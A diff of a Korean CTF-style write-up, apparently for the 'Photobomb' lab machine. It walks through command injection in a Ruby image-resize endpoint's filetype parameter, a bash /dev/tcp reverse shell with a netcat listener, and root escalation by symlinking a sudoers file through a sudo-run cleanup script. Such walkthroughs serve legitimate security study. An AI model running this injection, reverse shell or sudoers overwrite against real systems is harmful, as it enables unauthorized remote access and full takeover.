@@ -45,7 +45,7 @@
 
 - 에러를 지속적으로 발생시켜서 출력되는 코드의 일부분들을 조합하여 정리하면 이미지 resize 및 다운로드와 관련된 코드들을 어떻게 동작하는지 확인이 가능하다.
 
-```rb
+~~~rb
 post '/printer' do
   photo = params[:photo]
   filetype = params[:filetype]
@@ -85,27 +85,27 @@ post '/printer' do
   else
     puts "File already exists."
   end
-```
+~~~
 
 - 상기한 코드를 확인하면 filename은 이미지 원본의 이름, 해상도, 파일 확장자로 구성되고
 
-```rb
+~~~rb
 filename = photo.sub('.jpg', '') + '_' + dimensions + '.' + filetype
-```
+~~~
 
 - 이 filename은 command의 맨 마지막에 붙는다.
 
-```rb
+~~~rb
 command = 'convert source_images/' + photo + ' -resize ' + dimensions + ' resized_images/' + filename
     puts "Executing: #{command}"
     system(command)
-```
+~~~
 
 - 따라서 command의 맨 마지막에 붙는 부분은 filetype 변수이다.
 
-```rb
+~~~rb
 command = 'convert source_images/' + photo + ' -resize ' + dimensions + ' resized_images/' + photo.sub('.jpg', '') + '_' + dimensions + '.' + filetype
-```
+~~~
 
 - 결과적으로 command의 마지막 부분에 &&등을 붙이고 뒤에 리버스 쉘을 실행하는 명령어 (bash -c 'bash -i >& /dev/tcp/ip/port 0>&1')를 붙이면 될 것으로 예상했다.
 
@@ -117,7 +117,7 @@ command = 'convert source_images/' + photo + ' -resize ' + dimensions + ' resize
 
 - 우선 netcat 명령어를 로컬 PC의 터미널에서 실행하고
 
-~~~shell
+~~~bash
 [hackryptic@Hackryptic-PC-1 ~]$ nc -lvnp port
 ~~~
 
@@ -147,7 +147,7 @@ hoto=wolfgang-hasselmann-RLEgmd1O7gs-unsplash.jpg&filetype=jpg%26%26bash%20-c%20
 
 - 확장자 뒤쪽에 쉘 실행 명령어를 붙이면 다음과 같이 접속에 성공한다.
 
-~~~shell
+~~~bash
 bash: cannot set terminal process group (722): Inappropriate ioctl for device
 bash: no job control in this shell
 wizard@photobomb:~/photobomb$ 
@@ -161,7 +161,7 @@ wizard@photobomb:~/photobomb$
 
 - 우선, sudo -l을 통해 sudo 권한이 걸린 명령어를 확인해보면 다음과 같은 결과가 출력된다.
 
-~~~shell
+~~~bash
 wizard@photobomb:~/photobomb$ sudo -l
 
 Matching Defaults entries for wizard on photobomb:
@@ -174,7 +174,7 @@ User wizard may run the following commands on photobomb:
 
 - cleanup.sh 파일의 내용은 다음과 같다.
 
-~~~shell
+~~~bash
 #!/bin/bash
 . /opt/.bashrc
 cd /home/wizard/photobomb
@@ -199,31 +199,31 @@ find source_images -type f -name '*.jpg' -exec chown root:root {} \;
 
 - 따라서 sudoers 파일을 조작하기 위해 다음과 같이 심볼릭 링크를 걸어준다. (파일이 이미 존재하면 photobomb.log.old 파일을 삭제한 뒤에 링크를 건다.)
 
-~~~shell
+~~~bash
 wizard@photobomb:~/photobomb$ ln -s /etc/sudoers.d/photobomb ~/photobomb/log/photobomb.log.old
 ~~~
 
 - 아래와 같이 심볼릭 링크가 제대로 되었는지 확인한 후에
 
-~~~shell
+~~~bash
 lrwxrwxrwx 1 wizard wizard 24 Nov  8 02:22 /home/wizard/photobomb/log/photobomb.log.old -> /etc/sudoers.d/photobomb
 ~~~
 
 - sudo 권한을 부여하기 위한 내용을 photobomb.log 파일에 작성하고
 
-~~~shell
+~~~bash
 wizard@photobomb:~/photobomb$ echo "wizard ALL=(ALL) NOPASSWD: ALL" > ~/photobomb/log/photobomb.log
 ~~~
 
 - 마지막으로/opt/cleanup.sh를 실행하면
 
-~~~shell
+~~~bash
 wizard@photobomb:~/photobomb$ sudo /opt/cleanup.sh
 ~~~
 
 - 다음과 같이 root 권한으로 상승할 수 있다.
 
-~~~shell
+~~~bash
 wizard@photobomb:~/photobomb$ sudo su
 root@photobomb:/home/wizard/photobomb#
 ~~~
